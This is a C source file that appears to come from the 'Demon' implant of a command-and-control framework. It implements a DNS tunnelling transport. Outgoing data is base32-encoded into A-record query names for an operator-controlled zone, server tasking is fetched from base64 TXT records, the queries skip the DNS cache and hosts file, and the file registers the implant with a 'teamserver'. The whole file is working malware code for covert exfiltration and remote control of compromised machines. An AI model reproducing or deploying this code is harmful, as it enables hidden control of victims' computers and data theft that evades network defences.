#ifdef TRANSPORT_DNS

#include <Demon.h>
#include <common/Macros.h>
#include <core/TransportDns.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <crypt/Base64.h>

/* RFC 4648 base32 alphabet: a–z2–7, lowercase, no padding */
static const CHAR B32Alphabet[ 32 ] = "abcdefghijklmnopqrstuvwxyz234567";

/* DnsQuery_W DNS_TYPE_A = 1, DNS_TYPE_TEXT = 16 */
#define DNS_TYPE_A    1
#define DNS_TYPE_TEXT 16

/* ------------------------------------------------------------------ */
/*  Base32 encode / decode                                             */
/* ------------------------------------------------------------------ */

VOID DnsBase32Encode( PBYTE In, DWORD InLen, PCHAR Out )
{
    DWORD i   = 0;
    DWORD j   = 0;
    UINT  buf = 0;
    INT   bits = 0;

    for ( i = 0; i < InLen; i++ )
    {
        buf  = ( buf << 8 ) | In[ i ];
        bits += 8;
        while ( bits >= 5 )
        {
            bits -= 5;
            Out[ j++ ] = B32Alphabet[ ( buf >> bits ) & 0x1F ];
        }
    }
    if ( bits > 0 )
        Out[ j++ ] = B32Alphabet[ ( buf << ( 5 - bits ) ) & 0x1F ];

    Out[ j ] = '\0';
}

DWORD DnsBase32Decode( PCHAR In, DWORD InLen, PBYTE Out )
{
    UINT  buf   = 0;
    INT   bits  = 0;
    DWORD j     = 0;
    DWORD i;
    BYTE  v;
    CHAR  c;

    for ( i = 0; i < InLen; i++ )
    {
        c = In[ i ];
        if ( c >= 'a' && c <= 'z' )      v = (BYTE)( c - 'a' );
        else if ( c >= '2' && c <= '7' ) v = (BYTE)( c - '2' + 26 );
        else break; /* padding or invalid */

        buf  = ( buf << 5 ) | v;
        bits += 5;
        if ( bits >= 8 )
        {
            bits -= 8;
            Out[ j++ ] = (BYTE)( buf >> bits );
        }
    }
    return j;
}

/* ------------------------------------------------------------------ */
/*  FQDN builders                                                      */
/* ------------------------------------------------------------------ */

/* Build uplink A-query FQDN into Out (must be ≥ 253 bytes).
 * Format: <b32chunk>.<seq4><cid2><tot2>.<aid8>.<zone> */
static VOID DnsBuildUploadFqdn(
    PBYTE  Chunk, DWORD ChunkLen,
    UINT16 Seq,   BYTE  Cid, BYTE Tot,
    DWORD  AgentID,
    LPWSTR Zone,
    PCHAR  Out
) {
    CHAR b32[ 64 ]  = { 0 };
    CHAR meta[ 9 ]  = { 0 };
    CHAR aid[ 9 ]   = { 0 };
    CHAR zoneA[ 64 ] = { 0 };
    DWORD i;

    DnsBase32Encode( Chunk, ChunkLen, b32 );

    /* meta = seq4 + cid2 + tot2 (8 hex chars) */
    wsprintfA( meta, "%04x%02x%02x", (UINT)Seq, (UINT)Cid, (UINT)Tot );
    wsprintfA( aid,  "%08x", AgentID );

    /* Convert zone from WCHAR to CHAR */
    for ( i = 0; Zone[ i ] && i < 63; i++ )
        zoneA[ i ] = (CHAR)Zone[ i ];
    zoneA[ i ] = '\0';

    wsprintfA( Out, "%s.%s.%s.%s", b32, meta, aid, zoneA );
}

/* Build downlink TXT-poll FQDN into Out.
 * Format: p.<seq4>.<off4>.<aid8>.<zone> */
static VOID DnsBuildPollFqdn(
    UINT16 Seq,
    UINT16 Offset,
    DWORD  AgentID,
    LPWSTR Zone,
    PCHAR  Out
) {
    CHAR zoneA[ 64 ] = { 0 };
    DWORD i;

    for ( i = 0; Zone[ i ] && i < 63; i++ )
        zoneA[ i ] = (CHAR)Zone[ i ];
    zoneA[ i ] = '\0';

    wsprintfA( Out, "p.%04x.%04x.%08x.%s", (UINT)Seq, (UINT)Offset, AgentID, zoneA );
}

/* ------------------------------------------------------------------ */
/*  DNS wire queries via dnsapi.dll                                    */
/* ------------------------------------------------------------------ */

/* Send an A-query for Fqdn via DnsQuery_W.
 * Returns the raw DWORD IPv4 address (host byte order) or 0 on failure. */
static DWORD DnsQueryA( PCHAR Fqdn )
{
    WCHAR    FqdnW[ 253 ] = { 0 };
    PDNS_RECORD pRec      = NULL;
    DNS_STATUS  status;
    DWORD       result    = 0;
    DWORD       i;

    /* ASCII → wide */
    for ( i = 0; Fqdn[ i ]; i++ )
        FqdnW[ i ] = (WCHAR)Fqdn[ i ];

    status = Instance->Win32.DnsQuery_W(
        FqdnW,
        DNS_TYPE_A,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
        NULL,
        &pRec,
        NULL
    );

    if ( status == 0 && pRec )
    {
        result = pRec->Data.A.IpAddress;
        Instance->Win32.DnsRecordListFree( pRec, DnsFreeRecordList );
    }

    return result;
}

/* Send a TXT-query for Fqdn.
 * Decodes the first TXT string (base64) into OutBuf.
 * Returns number of decoded bytes, or 0 on failure / no data. */
static DWORD DnsQueryTxt( PCHAR Fqdn, PBYTE OutBuf, DWORD OutMax )
{
    WCHAR      FqdnW[ 253 ] = { 0 };
    PDNS_RECORD pRec         = NULL;
    DNS_STATUS  status;
    DWORD       decoded      = 0;
    DWORD       i;

    for ( i = 0; Fqdn[ i ]; i++ )
        FqdnW[ i ] = (WCHAR)Fqdn[ i ];

    status = Instance->Win32.DnsQuery_W(
        FqdnW,
        DNS_TYPE_TEXT,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
        NULL,
        &pRec,
        NULL
    );

    if ( status != 0 || !pRec )
        return 0;

    /* Iterate TXT strings in the first TEXT record */
    if ( pRec->wType == DNS_TYPE_TEXT && pRec->Data.TXT.dwStringCount > 0 )
    {
        LPWSTR wStr = pRec->Data.TXT.pStringArray[ 0 ];
        CHAR   aStr[ 512 ] = { 0 };
        DWORD  sLen        = 0;

        while ( wStr[ sLen ] && sLen < 511 )
        {
            aStr[ sLen ] = (CHAR)wStr[ sLen ];
            sLen++;
        }

        /* Base64 decode into OutBuf */
        decoded = Base64Decode( (PBYTE)aStr, sLen, OutBuf, OutMax );
    }

    Instance->Win32.DnsRecordListFree( pRec, DnsFreeRecordList );
    return decoded;
}

/* ------------------------------------------------------------------ */
/*  DnsSend — main transport entry point                               */
/* ------------------------------------------------------------------ */

BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
{
    DWORD   AgentID  = Instance->Session.AgentID;
    UINT16  Seq      = Instance->Config.Transport.DnsCtx.SeqNum;
    LPWSTR  Zone     = Instance->Config.Transport.DnsCtx.Dns.ZoneDomain;
    DWORD   ChunkDelay = Instance->Config.Transport.DnsCtx.Dns.ChunkDelayMs;

    PBYTE   Data    = (PBYTE)SendData->Buffer;
    DWORD   DataLen = (DWORD)SendData->Length;

    CHAR    Fqdn[ 253 ] = { 0 };
    DWORD   IpResp;
    DWORD   off;
    DWORD   retry;
    DWORD   chunkLen;

    /* Increment sequence number (wrap 0xFFFF → 0x0001) */
    Seq++;
    if ( Seq == 0 ) Seq = 1;
    Instance->Config.Transport.DnsCtx.SeqNum = Seq;

    /* -------- UPLINK: send data as A-query chunks -------- */
    BYTE  TotalChunks = (BYTE)( ( DataLen + DNS_CHUNK_BYTES - 1 ) / DNS_CHUNK_BYTES );
    if ( TotalChunks == 0 ) TotalChunks = 1;

    for ( BYTE cid = 0; cid < TotalChunks; cid++ )
    {
        off      = (DWORD)cid * DNS_CHUNK_BYTES;
        chunkLen = DataLen - off;
        if ( chunkLen > DNS_CHUNK_BYTES ) chunkLen = DNS_CHUNK_BYTES;

        DnsBuildUploadFqdn(
            Data + off, chunkLen,
            Seq, cid, TotalChunks,
            AgentID,
            Zone,
            Fqdn
        );

        retry = 0;
        do {
            IpResp = DnsQueryA( Fqdn );
            /* 0.0.0.2 = NACK, retry; 0.0.0.1 = ACK; 0.0.0.0 = rejected */
        } while ( IpResp == 0x02000000 && ++retry < DNS_RETRY_MAX );

        if ( IpResp != 0x01000000 )
        {
            PRINTF( "DnsSend: chunk %d rejected (ip=%08x)\n", (int)cid, IpResp )
            return FALSE;
        }

        if ( ChunkDelay )
            Instance->Win32.WaitForSingleObjectEx( (HANDLE)-1, ChunkDelay, FALSE );
    }

    /* -------- DOWNLINK: poll TXT records for server response -------- */
    UINT16 PollOffset = 0;
    BOOL   Done       = FALSE;
    DWORD  Iter       = 0;

    /* Pre-allocate a response accumulation buffer */
    DWORD  RespCap    = 0x4000; /* 16 KB initial, grown as needed */
    PBYTE  RespBuf    = (PBYTE)Instance->Win32.LocalAlloc( LPTR, RespCap );
    DWORD  RespLen    = 0;

    if ( !RespBuf ) return FALSE;

    BYTE  TxtBuf[ 512 ];

    while ( !Done && Iter < DNS_POLL_MAX_ITER )
    {
        Iter++;
        MemZero( TxtBuf, sizeof( TxtBuf ) );

        DnsBuildPollFqdn( Seq, PollOffset, AgentID, Zone, Fqdn );

        DWORD Got = DnsQueryTxt( Fqdn, TxtBuf, sizeof( TxtBuf ) );
        if ( Got == 0 )
        {
            /* No data ready — wait one slot and retry */
            Instance->Win32.WaitForSingleObjectEx( (HANDLE)-1, 500, FALSE );
            continue;
        }

        /* Check for sentinel byte 0xFF indicating last chunk */
        if ( TxtBuf[ 0 ] == 0xFF )
        {
            /* Append remaining bytes (after sentinel) */
            DWORD Extra = Got - 1;
            if ( Extra > 0 )
            {
                if ( RespLen + Extra > RespCap )
                {
                    RespCap = RespLen + Extra + 0x1000;
                    RespBuf = (PBYTE)Instance->Win32.LocalReAlloc( RespBuf, RespCap, LMEM_MOVEABLE | LMEM_ZEROINIT );
                    if ( !RespBuf ) return FALSE;
                }
                MemCopy( RespBuf + RespLen, TxtBuf + 1, Extra );
                RespLen += Extra;
            }
            Done = TRUE;
        }
        else
        {
            /* Normal chunk — append and advance offset */
            if ( RespLen + Got > RespCap )
            {
                RespCap = RespLen + Got + 0x4000;
                RespBuf = (PBYTE)Instance->Win32.LocalReAlloc( RespBuf, RespCap, LMEM_MOVEABLE | LMEM_ZEROINIT );
                if ( !RespBuf ) return FALSE;
            }
            MemCopy( RespBuf + RespLen, TxtBuf, Got );
            RespLen   += Got;
            PollOffset += (UINT16)( Got );
        }
    }

    if ( !Done || RespLen == 0 )
    {
        Instance->Win32.LocalFree( RespBuf );
        return FALSE;
    }

    RecvData->Buffer = RespBuf;
    RecvData->Length = RespLen;
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  DnsTransportInit — send DEMON_INITIALIZE via DNS                   */
/* ------------------------------------------------------------------ */

BOOL DnsTransportInit( VOID )
{
    PVOID  RawData = NULL;
    SIZE_T RawSize = 0;

    /* PackageTransmitNow assembles and encrypts MetaData, writes to RawData/RawSize */
    if ( !PackageTransmitNow( Instance->MetaData, &RawData, &RawSize ) )
        return FALSE;

    BUFFER Send = { .Buffer = RawData, .Length = RawSize };
    BUFFER Recv = { 0 };

    if ( !DnsSend( &Send, &Recv ) )
        return FALSE;

    /* The teamserver echoes back the 4-byte AgentID encrypted with AES */
    if ( Recv.Buffer && Recv.Length >= 4 )
    {
        if ( (UINT32)Instance->Session.AgentID == (UINT32)DEREF( Recv.Buffer ) )
        {
            Instance->Session.Connected = TRUE;
            Instance->Win32.LocalFree( Recv.Buffer );
            return TRUE;
        }
        Instance->Win32.LocalFree( Recv.Buffer );
    }

    return FALSE;
}

#endif /* TRANSPORT_DNS */
